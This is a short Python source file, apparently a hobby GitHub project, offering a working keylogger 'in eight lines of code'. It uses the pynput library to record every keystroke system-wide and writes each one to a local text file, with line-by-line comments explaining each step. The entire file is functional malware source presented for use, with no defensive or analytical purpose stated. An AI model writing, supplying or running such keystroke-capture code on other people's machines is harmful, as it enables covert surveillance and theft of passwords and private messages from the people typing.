#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# -----------------------------------------------------------------------------------------------------------
# Name:         tinykeylogger02.py
# Purpose:      Another example of shorter keylogger code in python. Now with eight lines of code.
# Author:       Gabriel Marti Fuentes
# email:        gabimarti at gmail dot com
# GitHub:       https://github.com/gabimarti
# Created:      17/08/2019
# License:      GPLv3
# -----------------------------------------------------------------------------------------------------------

import logging, pynput                              # 1 - imports


def on_press_key(key):                              # 2 - Event that record keystrokes
    logging.debug('{}'.format(key))                 # 3 - Save keystroke on file


file_keylog = 'tinykeylogger02.txt'                 # 4 - Filename where keystrokes are recorded
logging.StreamHandler.terminator = ''               # 5 - Avoids CRLF after every keystroke recorded
logging.basicConfig(filename=file_keylog, level=logging.DEBUG, format='%(message)s')  # 6 - Sets logging

with pynput.keyboard.Listener(on_press=on_press_key) as listener:  # 7 - Create listener
    listener.join()                                 # 8 - Wait for threads end

